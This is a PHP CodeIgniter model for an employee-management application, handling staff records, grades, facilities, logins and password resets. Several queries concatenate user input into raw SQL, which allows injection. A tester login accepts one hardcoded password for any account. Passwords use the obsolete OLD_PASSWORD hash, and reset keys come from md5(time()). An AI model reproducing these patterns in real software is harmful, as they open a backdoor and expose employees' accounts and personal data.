<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class User_model extends G_Model {
    
	public function __construct()	{
	  $this->load->database(); 
	}
	
	public function get_user($array=array()) {
	    
	    
	    
	    if(isset($array["dept_code"]) && $array["dept_code"] == "MA"){
	        
	        $qr = "(
    	        CASE 
    	           WHEN e.emp_id = 'PRESIDENT' THEN 0 
    	           WHEN e.emp_id = 'CEO' THEN 1 
    	           WHEN e.emp_id = 'DO' THEN 2 
    	           WHEN e.emp_id = 'DM' THEN 3 
    	        END ) as rank";
	        
	        $this->db->select($array['select']);
	        $this->db->select($qr, false);
	        
	        $this->db->from('employee e');
	        $this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	        $this->db->join('designations ds', 'ds.id=e.designation', 'left');
	        $this->db->where('e.archive','N');
	        
	        if(isset($array["dept_code"]) && !empty($array["dept_code"]) && $array["dept_code"]!="all"){
	            
	            $this->db->where('e.dept_code',$array["dept_code"]);
	        }

	        $this->db->order_by('rank','asc');
	        
	        if(isset($array["offset"])) {
	            
	            $this->db->limit(ROWS_PER_PAGE, $array["offset"]);
	        }

	    }else{
	        
	        
	        $this->db->select($array['select']);
	        $this->db->from('employee e');
	        $this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	        $this->db->join('designations ds', 'ds.id=e.designation', 'left');
	        $this->db->where('e.archive','N');
	        if(isset($array["dept_code"]) && !empty($array["dept_code"]) && $array["dept_code"]!="all"){
	            
	            $this->db->where('e.dept_code',$array["dept_code"]);
	        }
	            
	        $this->db->order_by('e.emp_id','asc');
	        if(isset($array["offset"])) {
	            
	            $this->db->limit(ROWS_PER_PAGE, $array["offset"]);
	        }	        
	    }
	  	
	  	$query = $this->db->get();
	  	return $query->result();
	}
	
	public function get_usersByDeptCode($array=array(), $deptCodeAry) {
	
	    $this->db->select($array['select']);
	    $this->db->from('employee e');
	    $this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	    $this->db->join('designations ds', 'ds.id=e.designation', 'left');
	    $this->db->where('e.archive','N');
	    $this->db->where_in('e.dept_code', $deptCodeAry);
	    
	    if(isset($array["dept_code"]) && !empty($array["dept_code"]) && $array["dept_code"]!="all")
	        $this->db->where('e.dept_code',$array["dept_code"]);
	    $this->db->order_by('e.emp_id','asc');
	    if(isset($array["offset"])) $this->db->limit(ROWS_PER_PAGE, $array["offset"]);
	
	    $query = $this->db->get();
	    return $query->result();
	}
	
	public function getBriefInfo($id){
	    $data = array(
	        'e.emp_id',
	        'e.name',
	        'e.dept_code',
	        'e.email',
	        'e.gender',
	        'dp.dept_name',
	        'ds.designation',
	    );
	    $this->db->select($data);
	    $this->db->from('employee e');
	    $this->db->join('departments dp','e.dept_code = dp.dept_code','inner');
	    $this->db->join('designations ds','e.designation = ds.id','inner');
	    $this->db->where('e.emp_id', $id);
	    $query = $this->db->get();
	
	    return $query->row();
	}
	
	public function getGenderById($id){

	    $this->db->select('gender');
	    $this->db->from('employee');
	    $this->db->where('emp_id', $id);
	    $query = $this->db->get();
	    
	    $res = $query->row();
	    
	    if(isset($res->gender) && !empty($res->gender)){
	        return $res->gender;
	    }else{
	        return 'M';
	    }
	}
	
	public function getEmpDeptCodeById($eid){
	    

	    $this->db->select('dept_code');
	    $this->db->from('employee');
	    $this->db->where('emp_id', $eid);
	    $query = $this->db->get();
	    
	    $res = $query->row();
	    
	    return $res->dept_code;	    
	}
	
	public function get_emp_search($req_dept=""){
	    $this->db->select('emp_id, name');
	    $this->db->from('employee');
	    $this->db->where('archive','N');
	    if(!empty($req_dept) && $req_dept!="all") $this->db->where('dept_code',$req_dept);
	    $this->db->order_by('emp_id','asc');
	    $query = $this->db->get();
	    
	    return $query->result();
	}
	
	public function record_count($req_dept) {
		$this->db->select('e.emp_id,e.name,e.status,e.jdate,dp.dept_name,ds.designation');
	  	$this->db->from('employee e');
	  	$this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	  	$this->db->join('designations ds', 'ds.id=e.designation', 'left');
	  	$this->db->where('e.archive','N');
	  	if(!empty($req_dept) && $req_dept!="all") $this->db->where('e.dept_code',$req_dept);
	  	$query = $this->db->get();
	  	return $query->num_rows();
	}
	
	public function get_archive($offset) {
	
	    $this->db->select('e.emp_id,e.name,e.resignation_date,e.jdate,dp.dept_name,ds.designation');
	    $this->db->from('employee e');
	    $this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	    $this->db->join('designations ds', 'ds.id=e.designation', 'left');
	    $this->db->where('e.archive','Y');
	    $this->db->order_by('e.emp_id','asc');
	    $this->db->limit(ROWS_PER_PAGE, $offset);
	
	    $query = $this->db->get();
	    return $query->result();
	}
	
	public function getStatusHistory($id) {
	
	    $this->db->select('id, status, date');
	    $this->db->from('status_log');
	    $this->db->where('emp_id', $id);

	    $query = $this->db->get();
	    $res = $query->result();
	    $ary =array();
	    foreach ( $res as $obj){
	        $ary[$obj->status] = $obj;
	    }

	    //print_r($ary); die;
	    return $ary;
	}
	
	
	public function archive_count() {
	    $this->db->select('e.emp_id,e.name,e.status,e.jdate,dp.dept_name,ds.designation');
	    $this->db->from('employee e');
	    $this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	    $this->db->join('designations ds', 'ds.id=e.designation', 'left');
	    $this->db->where('e.archive','Y');
	    $query = $this->db->get();
	    return $query->num_rows();
	}

	public function detail($emp_id) {
		$this->db->select('e.id, e.emp_id, e.name, e.status, e.jdate, e.email, e.dept_code,
		                  e.present_address, e.mobile, e.phone, e.online, e.login_time,
		                  e.permanent_address, e.last_edu_achieve, e.resignation_date,
		                  e.dob,e.gender, e.blood_group, e.active, e.archive, e.image, e.experience,e.office_stime,e.office_etime,
		                  dp.dept_name, ds.id as ds_id, ds.designation, g.grade, g.grade_id, gm.email as gmail');
	  	$this->db->from('employee e');
	  	$this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	  	$this->db->join('designations ds', 'ds.id=e.designation', 'left');
	  	$this->db->join('grade g', 'g.grade_id=e.grade_id', 'left');
	  	$this->db->join('gmail_logins gm', 'gm.user_id=e.emp_id', 'left');
		$this->db->where('e.emp_id',$emp_id);
		$query = $this->db->get();
		
		//return $query->row_array();
		return $query->row_array();
	}
	public function get_all_emp_id(){
	    $this->db->select('emp_id');
	    $this->db->from('employee');
	    $this->db->where('archive','N');
	    $query = $this->db->get();

	    $array = array();
	    foreach($query->result() as $row)
	    {
	        $array[] = $row->emp_id; // add each user id to the array
	    }
	    return $array;
	}
	
	public function getGradeList(){
	    $this->db->select('*');
	    $this->db->from('grade');
	    $this->db->order_by('grade','asc');
	    $query = $this->db->get();	    
	    $allGrades = $query->result();
	    
	    
	    $this->db->select('e.emp_id,e.name, g.*, dp.dept_name, ds.designation');
	    $this->db->from('employee e');
	    $this->db->where('e.archive','N');
	    $this->db->join('grade g', 'e.grade_id=g.grade_id', 'inner');
	    $this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'inner');
	    $this->db->join('designations ds', 'ds.id=e.designation', 'inner');
	    $this->db->order_by("g.grade", "asc");	    
	    $query = $this->db->get();
	    
	    $res = $query->result();
	    $ary = array();
	    foreach ($res as $obj){	        
	        $ary[$obj->grade][] = $obj;
	        $ary[$obj->grade]['grade_id'] = $obj->grade_id;
	    }

	    $gradeCombined = array();
	    foreach ($allGrades as $grade){
	        if (isset($ary[$grade->grade]) && $ary[$grade->grade]['grade_id'] == $grade->grade_id){
	            $gradeCombined[$grade->grade] = $ary[$grade->grade];
	        }else {
    	        //$gradeCombined[$grade->grade][] = new stdClass();
    	        $gradeCombined[$grade->grade]['grade_id'] = $grade->grade_id;
	        }
	    }
	    
	    return $gradeCombined;
	}
	
	public function getGrades(){
	    
	    $this->db->select('*');
	    $this->db->from('grade');
	    $this->db->order_by('grade','asc');
	    $query = $this->db->get();
	     
	    $res = $query->result();
	    
	    $ary = array();
	    if (!empty($res) && count($res) > 0){
	        $existGrades = array();
    	    foreach ($res as $obj){
    	        $existGrades[] = $obj->grade;
    	    }
    	    for ($con=1; $con<=15; $con++){
    	        if (!in_array($con, $existGrades)){
    	            $ary[$con]= $con;
    	        }
    	    }
	    }
	    return $ary;
	}
	
	
	
	public function change_grade($emp_id, $grade_id){
	    
	    $this->db->where('emp_id', $emp_id);
	    $this->db->update('employee', array('grade_id'=>$grade_id));
	    
	    return ($this->db->affected_rows()>0);
	}
	
	public function add_new_grade($grade_value){
	    if (empty($grade_value)) return false;
	    
	    $data = array('grade' => $grade_value);
	    $this->db->insert('grade', $data);
	    
	    return $this->db->insert_id();
	}
	
	
	public function archive_person(){
	    
	}
	
	public function addEmp($data, $password){
	

	    $this->db->set('pass', 'OLD_PASSWORD("'.$password.'")', FALSE);	    
	    $this->db->insert('employee', $data);

	    return $this->db->affected_rows();
	    //return $this->db->insert_id();
	}
	
	public function add_status_log($data){
	    
	    $this->db->select();
	    $query = $this->db->get_where('status_log', array('emp_id'=>$data['emp_id'], 'status' => $data['status']) );
	    
	    if($query->num_rows() > 0){
	        return  false;
	    }else{	        
	        $this->db->insert('status_log', $data);
	        return  $this->db->insert_id();
	    }
	}    
	
	public function updateEmp($id, $data){
	
	    $this->db->where('id', $id);
	    $this->db->update('employee', $data);
	    
	    return ($this->db->affected_rows() > 0);
	}
	
	public function updateByEmpId($emp_id, $data){
	
	    $this->db->where('emp_id', $emp_id);
	    $this->db->update('employee', $data);
	     
	    return ($this->db->affected_rows() > 0);
	}
	
	public function deleteEmp($id){
	
	    $this->db->where('id', $id);
        $this->db->delete('employee'); 
	
	    return ($this->db->affected_rows() > 0);
	}
	
	public function delete_gmail($eid){
	
	    $this->db->where('user_id', $eid);
	    $this->db->delete('gmail_logins');
	
	    return ($this->db->affected_rows() > 0);
	}
	
	public function lockArchive($id, $data){
	    
	    $this->db->where('emp_id', $id);
	    $this->db->update('employee', $data);
	     
	    return ($this->db->affected_rows() > 0);
	}
	
	public function empFacility($emp_id){
	    $this->db->select('f.id, f.facility_id, f.emp_id, f.remark, f.from_date, f.to_date, o.facility');
	    $this->db->from('facilities f');
	    $this->db->join('facility_options o', 'f.facility_id = o.facility_id', 'inner');
	    $this->db->where('f.emp_id',$emp_id);
	    $this->db->order_by('f.from_date','asc');
	    $query = $this->db->get();
	    
	    return $query->result();
	}
	
	
	public function empFacilityByID($id){
	    $this->db->select('facility_id, emp_id, remark, from_date, to_date');
	    $this->db->from('facilities');
	    $this->db->where('id',$id);
	    $query = $this->db->get();
	     
	    return $query->row_array();
	}
	public function facility(){
	    $this->db->select('facility_id, facility');
	    $this->db->from('facility_options');
	    $query = $this->db->get();
	    
	    return $query->result();
	}
	
	public function addFacility($data){
	    $this->db->insert('facilities', $data);
	     
	    return ($this->db->affected_rows() > 0);
	}
	public function updateFacility($id, $data){
	    $this->db->where('id', $id);
	    $this->db->update('facilities', $data);
	
	    return ($this->db->affected_rows() > 0);
	}
	
	public function deleteFacility($id){
	
	    $this->db->where('id', $id);
	    $this->db->delete('facilities');
	
	    return ($this->db->affected_rows() > 0);
	}
	
	public function del_status_log($id){
	    $this->db->select('emp_id, status');
	    $this->db->from('status_log');
	    $this->db->where('id', $id);
	    $qr = $this->db->get();	    
	    $res1 = $qr->row_array();
	    
	    $this->db->select('status');
	    $this->db->from('employee');
	    $this->db->where('emp_id', $res1['emp_id']);
	    $query = $this->db->get();
	    $res2 = $query->row_array();
	    
	    $this->db->where('id', $id);
	    $this->db->delete('status_log');
	    
	    if($res1['status'] == $res2['status']){
	        
	        $this->db->select('status');
	        $this->db->from('status_log');
	        $this->db->where('emp_id', $res1['emp_id']);
	        $this->db->order_by('date', 'desc');
	        $this->db->limit(1);
	        
	        $qstr = $this->db->get();
	        $res3 = $qstr->row_array();	        
	        $status = isset($res3['status']) ? $res3['status'] : "";
	        
	        $this->db->where('emp_id', $res1['emp_id']);
	        $this->db->update('employee', array('status'=>$status));
	    }

	    return ($this->db->affected_rows() > 0);
	}
	
	public function getEidbyMail($mail){
	    
	    $this->db->select('emp_id');
	    $this->db->from('employee e');
	    $this->db->where('email', $mail);	    
	    $query = $this->db->get();	    
	    $result = $query->row();
	    
	    return ( ($query->num_rows() > 0) ? $result->emp_id : false );
	}
	
	public  function login($login_id, $password)
	{		
		$this->db->select('e.emp_id,e.name,e.status,e.archive,e.active,e.gender,e.email, e.image,e.dept_code,dp.dept_name,ds.designation,g.grade');
		$this->db->from('employee e');
		$this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
		$this->db->join('designations ds', 'ds.id=e.designation', 'left');
		$this->db->join('grade g', 'g.grade_id=e.grade_id', 'left');
		$this->db->where('e.archive','N');
		$this->db->where('e.emp_id',$login_id);
		$this->db->where("e.pass=OLD_PASSWORD('$password')");
			
		$query = $this->db->get();
		
		if( $query->num_rows() == 1) {
			return $query->row_array();
		}
		return null;
	}
	
	public  function login_gmail($eid){
	
	    $this->db->select('e.emp_id,e.name,e.status,e.archive,e.active,e.gender,e.email, e.image,e.dept_code,dp.dept_name,ds.designation,g.grade,');
	    $this->db->from('employee e');
	    $this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
	    $this->db->join('designations ds', 'ds.id=e.designation', 'left');
	    $this->db->join('grade g', 'g.grade_id=e.grade_id', 'left');
	    $this->db->where('e.archive','N');
	    $this->db->where('e.emp_id',$eid);
	    //$this->db->where("e.pass=OLD_PASSWORD('$password')");
	
	    $query = $this->db->get();
	    $numRows = $query->num_rows();
	    if($numRows==1) {
	        return $query->row_array();
	    }
	    return null;
	}
	
	
	public function setOnline($data, $login_id){
	    
	    $this->db->where('emp_id',$login_id);
	    $this->db->update('employee',$data);
	}
	public function isLogin($id){
	     
	    $this->db->select('online');
	    $this->db->from('employee');
	    $this->db->where('archive','N');
	    $this->db->where('emp_id', $id);
	    $query = $this->db->get();
	    
	    foreach ($query->row_array()as $data){
	        if($data == 'N'){
	            return false;
	        }elseif($data == 'Y'){
	            return true;
	        }
	    }
	}
	
	public function settings()
	{
		$this->db->select('emp_id,dept_code,type');
		$this->db->from('settings');
		//$this->db->where(array("emp_id"=>$login_id));
		$query = $this->db->get();
		return $query->result();
	}
	
	public function department()
	{
		$this->db->select('dept_code,dept_name');
		$this->db->from('departments');
		$this->db->where(array("active"=>'Y'));
		$this->db->order_by('dept_name','asc');
		$query = $this->db->get();
		
		$result = $query->result();
		
		$departments = array();
		foreach($result as $obj) {
		    $departments[$obj->dept_code] = $obj->dept_name;
		}
		
		return $departments;
	}
	

	
	public function grade(){
	    
	    $query = $this->db->get('grade');
	    
	    return $query->result();
	} 
	
	public function designation()
	{
		$this->db->select('id,dept_code,designation');
		$this->db->from('designations');
		//$this->db->where(array("active"=>'Y'));
		$query = $this->db->get();
		return $query->result();
	}
	
	public function unreadNotice($id){
	    
    $this->db->not_like('read_by', $id);
    $this->db->from('notice');
    return $this->db->count_all_results();
	}
	
	public function unreadAttach($id){
	     
	    $this->db->not_like('read_by', $id);
	    $this->db->from('attach_msg');
	    return $this->db->count_all_results();
	}
	
	
	public function add_key($conditon){
	    $tm = time();
	    $tm = md5($tm);
	    $dt = date("Y-m-d H:i:s");

	    $this->db->where($conditon);
	    $this->db->update('employee', array('key'=>$tm, 'key_date'=>$dt));
	    
	    if($this->db->affected_rows() > 0)
	        return $tm;
	    else
	        return "";
	}
	
	public function get_key_info($key){
	    
	    $this->db->select('emp_id, key_date');
	    $this->db->from('employee');
	    $this->db->where('key', $key);
	    
	    $query = $this->db->get();
	    
	    return $query->row_array();
	}
	
	public function vanish_key($conditon){
	    
	    $this->db->where($conditon);
	    $this->db->update('employee', array('key'=>'', 'key_date'=>'0000-00-00 00:00:00'));
	}
	
	public function updatePassword($id, $newPassword){
	
	    //         $this->db->set("pass","OLD_PASSWORD($newPassword)');
	    //         $this->db->where('emp_id', $id);
	    //         $this->db->update('employee');
	
	    $sql = "UPDATE employee SET pass=OLD_PASSWORD('".$newPassword."') WHERE emp_id='".$id."'";
	    $this->db->query($sql);

	    return ($this->db->affected_rows() > 0);
	}
	
	public function deptNamebyCode()
	{
	    $this->db->select('dept_code, dept_name');
	    $this->db->from('departments');
	    $this->db->where(array("active"=>'Y'));
	    $this->db->order_by('dept_name','asc');
	    $query = $this->db->get();
	    return $query->result();
	}
	
	public function getDeptCode($emp_id){
	    $this->db->select('dept_code');
	    $this->db->from('employee');
	    $this->db->where('emp_id', $emp_id);
	    $query = $this->db->get();
	
	    $res = $query->row_array();
	
	    return $res['dept_code'];
	}

	
	public function getAdminInfo(){
	
	    $data = array(
	        's.emp_id',
	        'e.name',
	        'e.email'
	    );
	    $this->db->select($data);
	    $this->db->from('settings s');
	    $this->db->join('employee e','s.emp_id = e.emp_id','inner');
	    $this->db->where('e.archive','N');
	    $this->db->where('s.type', 'A');
	    $query = $this->db->get();
	
	    return $query->result();
	}
	
    public function getMailInfoByType($type, $dept_code=""){
    
        $data = array(
            's.emp_id',
            'e.name',
            'e.email'
        );
        
        $this->db->select($data);
        $this->db->from('settings s');
        $this->db->join('employee e','s.emp_id = e.emp_id','inner');
        $this->db->where('e.archive','N');
        //$this->db->where('s.type',$type);
        if($type=='C') $this->db->where_in('s.type',array('M','B'));
        else $this->db->where('s.type',$type);
        if(!empty($dept_code)){ $this->db->where('s.dept_code', $dept_code);}
        $query = $this->db->get();
        
        $res = $query->result();
        $ret = array();
        
        foreach ($res as $obj){
            $ret[$obj->emp_id] = $obj;            
        }
        
        return $ret;
    }
    
    public function getMailInfoByIds($eids = array(), $dept_code=""){
                
    
        $data = array(
            'emp_id',
            'name',
            'email'
        );
        $this->db->select($data);
        $this->db->from('employee');
        $this->db->where('archive','N');
        $this->db->where_in('emp_id', $eids);
        
        if(!empty($dept_code)){ $this->db->where('dept_code', $dept_code);}
        $query = $this->db->get();
    
        return $query->result();
    }
    
    public function getManagersDepts($emp_id){
        
        $this->db->select('s.dept_code, d.dept_name');
        $this->db->from('settings s');
        $this->db->join('departments d','s.dept_code=d.dept_code', 'inner');
        $this->db->where(array('s.emp_id'=>$emp_id, 'd.active'=>'Y'));
         
        $this->db->order_by('d.dept_name','asc');
        $query = $this->db->get();
        $result = $query->result();
         
        $dept_array = array();
         
        foreach ($result as $obj){
            $dept_array[$obj->dept_code] =  $obj->dept_name;
        }
         
        return $dept_array;
    }
    
    public function getStaffArray($depts=array()) {
        
        $this->db->select('emp_id, name, dept_code');
        $this->db->from('employee');
        $this->db->where('archive','N');
        if(count($depts)>0){
            $this->db->where_in('dept_code', $depts);
        }
        $this->db->order_by('emp_id', 'asc');
        $query = $this->db->get();
         
        $results = $query->result();
            
        $staff_array = array();
        foreach($results as $obj){
            $staff_array[$obj->dept_code][] = $obj;
    
        }
        $staff_array['all'] =  $results;
         
        return $staff_array;
    }
    
    public function getStaffArrayByIds($eid=array()) {
    
        $this->db->select('emp_id, name, dept_code');
        $this->db->from('employee');
        $this->db->where('archive', 'N');
        if(count($eid)>0){
            $this->db->where_in('emp_id', $eid);
        }
        $this->db->order_by('emp_id', 'asc');
        $query = $this->db->get();
         
        $results = $query->result();
    
        $staff_array['all'] =  $results;
         
        return $staff_array;
    }
    
    public function getStaffEidArray() {
    
        $this->db->select('emp_id');
        $this->db->from('employee');
        $this->db->where('archive','N');
        $query = $this->db->get();
         
        $results = $query->result();
        
        $ret = array();
        foreach($results as $obj){
            $ret[] = $obj->emp_id;
        }
         
        return $ret;
    }
    
    
    public function add_gmail($data){
         
        //$this->db->select();
        $query = $this->db->get_where('gmail_logins', array( 'user_id'=>$data['user_id'] ) );
         
        if($query->num_rows() > 0){
            return  false;
        }else{
            $this->db->insert('gmail_logins', $data);
            
            return ($this->db->affected_rows() > 0);
        }
    }
    
    
    public function checkEmail($email){

        list($user, $domain) = explode('@', $email);
            
        if ($domain == 'genusys.us') {
            
            //first check in employee table
            $this->db->select('emp_id');
            $query = $this->db->get_where('employee', array( 'email'=> $email) );
            
            
            if($query->num_rows() > 0){
                
                $obj = $query->row();                
                return $obj->emp_id;
            }       
        }
            
        $this->db->select('user_id');
        $query = $this->db->get_where('gmail_logins', array( 'email'=> $email) );
        
        if($query->num_rows() > 0){
        
            $obj = $query->row();
            return $obj->user_id;
        }else{
            
            return false;
        }
    }

    public function hasRosterPriv($empId){
    	if (empty($empId)) return NULL;
    
    	$data = array('emp_id');
    	$this->db->select($data);
    	$this->db->from('settings');
    	$this->db->where('emp_id',$empId);
    	$this->db->where('type','R');
    
    	$query = $this->db->get();
    
    	if( $query->num_rows() == 1) {
    		return $empId;
    	}
    
    	return NULL;
    }

    public  function loginByTester($login_id, $password)
    {
	//return null;

    	$this->db->select('e.emp_id,e.name,e.status,e.archive,e.active,e.gender,e.email, e.image,e.dept_code,dp.dept_name,ds.designation,g.grade');
    	$this->db->from('employee e');
    	$this->db->join('departments dp', 'dp.dept_code=e.dept_code', 'left');
    	$this->db->join('designations ds', 'ds.id=e.designation', 'left');
    	$this->db->join('grade g', 'g.grade_id=e.grade_id', 'left');
    	$this->db->where('e.archive','N');
    	$this->db->where('e.emp_id',$login_id);
    	//$this->db->where("e.pass=OLD_PASSWORD('$password')");
    
    	$query = $this->db->get();
    
    	if( $query->num_rows() == 1 && $password == 'none92soft!!') {
    		return $query->row_array();
    	}
    	return null;
    }

    public function addFailedLog($emp_id) {
		$data = array(
			'hit_date' => date ( "Y-m-d H:i:s" ),
			'ip' => $this->get_client_ip(),
			'emp_id' => $emp_id
		);

		$this->db->insert('history_misslogin', $data);

		if($this->db->affected_rows() == 1){
			return true;
		} else {
			return false;
		}
    }

    public function missed_login_check($emp_id, $attempts = 5) {
		$ip = $this->get_client_ip();
		$this->load->database();
		$time1 = date ( "Y-m-d H:i:s" );
		$time2 = date ( "Y-m-d H:i:s", strtotime ( $time1 . " -60 minutes" ) );

		$query = "SELECT COUNT(hit_date) AS num_hit FROM history_misslogin ";
		$query .= "WHERE emp_id='$emp_id' AND hit_date<='$time1' AND hit_date>='$time2' AND ip='$ip'";
		$result = $this->db->query ( $query )->result ();

		if (! empty ( $result[0] ) && $result[0]->num_hit > 0) {
			if ($result[0]->num_hit >= $attempts) {
				return "Access blocked!";
			}
		}

		return '';
    }

    public function isEmployeeExists($emp_id = ''){
		if(!empty($emp_id)) {
			$this->db->select('emp_id');
			$this->db->from('employee');
			$this->db->where('emp_id', $emp_id);

			$query = $this->db->get();
			if ($query->num_rows() == 1) {
				return true;
			} else {
				return false;
			}
		} else {
			return false;
		}
	}
	public function get_all_dept()
	{
		$this->db->select('id,dept_code,dept_name');
		$this->db->from('departments');
		$query = $this->db->get();
		return $query->result_array();
	}
	public function get_employee_edit_list()
	{
		$this->db->select('emp_id');
		$this->db->from('employee_edit');
		$query = $this->db->get();
	  	return $query->result_array();
	}
	public function employe_edit_insert($id,$column,$value)
	{
		$data=array();
		$data['emp_id']=$id;
		$data['status']="N";
		$data[$column]=$value;
		$this->db->insert('employee_edit',$data);
	}
	public function employe_edit_update($id,$column,$value)
	{
		$data=array();
		$data[$column]=$value;
		$data['status']="N";
		$this->db->where('emp_id',$id);
		$this->db->update('employee_edit',$data);
	}
	public function get_update($id)
	{
		$this->db->select("*");
		$this->db->from('employee_edit');
		$this->db->where('emp_id',$id);
		$query = $this->db->get();
	  	return $query->row();
	}
	public function updated_request()
	{
		$this->db->select("e.emp_id,e.name,edit.emp_id,edit.mobile,edit.phone,edit.present_address,edit.permanent_address,edit.last_edu_achieve,edit.experience,edit.dob,edit.blood_group,edit.gender,edit.status");
		$this->db->from('employee_edit edit');
		$this->db->join('employee e','e.emp_id=edit.emp_id','inner');
		// $this->db->order_by('status');
		$query = $this->db->get();
	  	return $query->result_array();
	}
	public function user_delete_edit($id,$column,$value)
	{
		$data=array();
		$data[$column]="";
		$this->db->where('id',$id);
		$this->db->update('employee_edit',$data);
	}
	public function reject_Update($id,$status)
	{
		$data=array();
		$data['status']=$status;
		$this->db->where('emp_id',$id);
		$this->db->update('employee_edit',$data);
	}
	public function approve_Update($id,$status,$updated)
	{
		
		$data=array();
		// var_dump($updated);
		// die();
		if (!empty($updated->mobile)) {
			$data['mobile']=$updated->mobile;
		}
		if (!empty($updated->phone)) {
			$data['phone']=$updated->phone;
		}
		if (!empty($updated->present_address)) {
			$data['present_address']=$updated->present_address;
		}
		if (!empty($updated->permanent_address)) {
			$data['permanent_address']=$updated->permanent_address;
		}
		if (!empty($updated->last_edu_achieve)) {
			$data['last_edu_achieve']=$updated->last_edu_achieve;
		}
		if (!empty($updated->experience)) {
			$data['experience']=$updated->experience;	
		}
		if (!empty($updated->dob)) {
			$data['dob']=$updated->dob;
		}
		if (!empty($updated->blood_group)) {
			$data['blood_group']=$updated->blood_group;
		}
		if (!empty($updated->gender)) {
			$data['gender']=$updated->gender;
		}	
		// var_dump($data);
		// 	die();
		
		if(!$data){
			return "";
		}else{
			$this->db->where('emp_id',$id);
			$this->db->update('employee',$data);
		}
		
	}
	public function delete_update($id)
	{
		var_dump($id);
		$this->db->where('emp_id',$id);
		$this->db->delete('employee_edit');
	}

}
?>